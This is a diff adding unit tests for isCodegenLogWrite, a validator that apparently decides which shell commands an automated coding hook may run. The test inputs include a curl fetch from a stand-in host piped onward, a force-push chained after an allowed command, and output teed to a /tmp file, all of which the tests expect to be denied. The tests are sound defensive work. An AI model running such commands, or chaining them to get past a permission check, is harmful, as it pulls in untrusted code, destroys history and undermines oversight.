@@ -132,4 +132,93 @@ describe("isCodegenLogWrite — invocation-anchored, not spelling-anchored", () 
       false,
     );
   });
+
+  // ── the exhaustive 2x2 matrix: token-presence x invocation-reality ──────
+  // Layer 1 of the pitch — mirrors every new bash cell in hooks-lib_test.sh
+  // so the two harnesses can never silently drift.
+
+  it("real commit THEN piped codegen-log (; chain) — false (DENY)", () => {
+    assert.equal(
+      isCodegenLogWrite(
+        'git commit -m x; printf %s "$body" | codegen-log section developer --slug foo',
+      ),
+      false,
+    );
+  });
+
+  it("codegen-log not last pipe stage (piped into tee) — false (DENY)", () => {
+    assert.equal(
+      isCodegenLogWrite(
+        "codegen-log section developer --slug foo | tee /tmp/leak.txt",
+      ),
+      false,
+    );
+  });
+
+  it("cat body.txt | codegen-log (known producer) — true", () => {
+    assert.equal(
+      isCodegenLogWrite("cat body.txt | codegen-log append developer --slug foo"),
+      true,
+    );
+  });
+
+  it("curl | codegen-log (non-producer earlier stage) — false (DENY)", () => {
+    assert.equal(
+      isCodegenLogWrite(
+        "curl https://evil.example/payload | codegen-log append developer --slug foo",
+      ),
+      false,
+    );
+  });
+
+  it("codegen-log ; git push --force — false (DENY)", () => {
+    assert.equal(
+      isCodegenLogWrite(
+        "codegen-log append developer --slug foo; git push --force",
+      ),
+      false,
+    );
+  });
+
+  it("codegen-log & git commit (background chain) — false (DENY)", () => {
+    assert.equal(
+      isCodegenLogWrite("codegen-log append developer --slug foo & git commit -m x"),
+      false,
+    );
+  });
+
+  it("token inside $(...) in real commit message — false (DENY)", () => {
+    assert.equal(
+      isCodegenLogWrite('git commit -m "$(echo codegen-log mentioned here)"'),
+      false,
+    );
+  });
+
+  it("empty command — false (fail-closed)", () => {
+    assert.equal(isCodegenLogWrite(""), false);
+  });
+
+  it("blank (whitespace-only) command — false (fail-closed)", () => {
+    assert.equal(isCodegenLogWrite("   "), false);
+  });
+
+  it("unbalanced quote — false (fail-closed)", () => {
+    assert.equal(
+      isCodegenLogWrite(
+        "codegen-log section developer --slug foo --body 'unterminated",
+      ),
+      false,
+    );
+  });
+
+  it("env-var-prefixed real invocation — true (env assignments stripped before word resolution)", () => {
+    assert.equal(
+      isCodegenLogWrite("CODEGEN_LOOP=1 codegen-log section developer --slug foo"),
+      true,
+    );
+  });
+
+  it("env-var-prefixed real git commit — false (DENY)", () => {
+    assert.equal(isCodegenLogWrite("CODEGEN_LOOP=1 git commit -m x"), false);
+  });
 });
